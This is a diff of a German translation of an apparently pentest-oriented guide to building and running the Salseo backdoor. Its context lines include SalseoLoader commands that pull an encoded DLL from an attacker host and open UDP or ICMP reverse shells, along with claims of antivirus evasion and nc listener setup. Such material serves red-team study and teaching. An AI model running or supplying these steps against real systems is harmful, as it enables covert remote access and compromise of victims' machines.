@@ -10,7 +10,7 @@ Kompiliere diese Projekte für die Architektur des Windows-Systems, auf dem du s
 
 Du kannst **die Architektur auswählen** innerhalb von Visual Studio im **linken "Build"-Tab** unter **"Platform Target".**
 
-(\*\*Wenn du diese Optionen nicht findest, klicke auf **"Project Tab"** und dann auf **"\<Project Name> Properties"**)
+(**Wenn du diese Optionen nicht findest, klicke auf **"Project Tab"** und dann auf **"\<Project Name> Properties"**)
 
 ![](<../images/image (132).png>)
 
@@ -32,11 +32,11 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
-Ok, jetzt hast du alles, was du brauchst, um das Salseo-Ding auszuführen: die **kodierte EvilDalsa.dll** und die **Binärdatei von SalseoLoader.**
+Ok, jetzt hast du alles, was du brauchst, um die Salseo-Sache auszuführen: die **kodierte EvilDalsa.dll** und das **Binary von SalseoLoader.**
 
-**Lade die SalseoLoader.exe-Binärdatei auf die Maschine hoch. Sie sollten von keinem AV erkannt werden...**
+**Lade das SalseoLoader.exe-Binary auf die Maschine hoch. Sie sollten von keinem AV erkannt werden...**
 
-## **Führe die Hintertür aus**
+## **Führe das Backdoor aus**
 
 ### **Erhalte eine TCP-Reverse-Shell (kodierte DLL über HTTP herunterladen)**
 
@@ -50,9 +50,9 @@ Denken Sie daran, ein nc als Reverse-Shell-Listener zu starten und einen SMB-Ser
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
-### **Einen ICMP-Reverse-Shell erhalten (kodierte DLL bereits im Opfer)**
+### **Einen ICMP Reverse Shell erhalten (kodierte DLL bereits im Opfer)**
 
-**Diesmal benötigen Sie ein spezielles Tool auf dem Client, um die Reverse-Shell zu empfangen. Laden Sie herunter:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
+**Diesmal benötigen Sie ein spezielles Tool auf dem Client, um den Reverse Shell zu empfangen. Laden Sie herunter:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
 #### **ICMP-Antworten deaktivieren:**
 ```
@@ -83,9 +83,9 @@ SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 
 ![](<../images/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **Suchen Sie nach dem DllExport-Paket (unter Verwendung des Browse-Tabs) und drücken Sie Installieren (und akzeptieren Sie das Popup)**
+#### **Suchen Sie nach dem DllExport-Paket (unter Verwendung des Tabs Durchsuchen) und drücken Sie Installieren (und akzeptieren Sie das Popup)**
 
-![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 In Ihrem Projektordner sind die Dateien erschienen: **DllExport.bat** und **DllExport_Configure.bat**
 
@@ -101,7 +101,7 @@ Beenden Sie einfach Visual Studio
 
 Gehen Sie dann zu Ihrem **SalseoLoader-Ordner** und **führen Sie DllExport_Configure.bat** aus
 
-Wählen Sie **x64** (wenn Sie es in einer x64-Umgebung verwenden möchten, war das in meinem Fall so), wählen Sie **System.Runtime.InteropServices** (innerhalb von **Namespace für DllExport**) und drücken Sie **Übernehmen**
+Wählen Sie **x64** (wenn Sie es in einer x64-Umgebung verwenden möchten, war das mein Fall), wählen Sie **System.Runtime.InteropServices** (innerhalb **Namespace für DllExport**) und drücken Sie **Übernehmen**
 
 ![](<../images/image (7) (1) (1) (1) (1).png>)
 
@@ -121,11 +121,11 @@ Wählen Sie die **x64** **Plattform** (Projekt --> SalseoLoader-Eigenschaften --
 
 ![](<../images/image (9) (1) (1).png>)
 
-Um die Lösung zu **erstellen**: Erstellen --> Lösung erstellen (Im Ausgabekonsolenfenster wird der Pfad zur neuen DLL angezeigt)
+Um die Lösung zu **erstellen**: Erstellen --> Lösung erstellen (Im Ausgabekonsolenfenster wird der Pfad der neuen DLL angezeigt)
 
 ### Testen Sie die generierte DLL
 
-Kopieren Sie die DLL und fügen Sie sie dort ein, wo Sie sie testen möchten.
+Kopieren und fügen Sie die DLL dort ein, wo Sie sie testen möchten.
 
 Führen Sie aus:
 ```
@@ -135,7 +135,7 @@ Wenn kein Fehler auftritt, haben Sie wahrscheinlich eine funktionale DLL!!
 
 ## Holen Sie sich eine Shell mit der DLL
 
-Vergessen Sie nicht, einen **HTTP** **Server** zu verwenden und einen **nc** **Listener** einzurichten
+Vergessen Sie nicht, einen **HTTP** **Server** zu verwenden und einen **nc** **Listener** einzurichten.
 
 ### Powershell
 ```
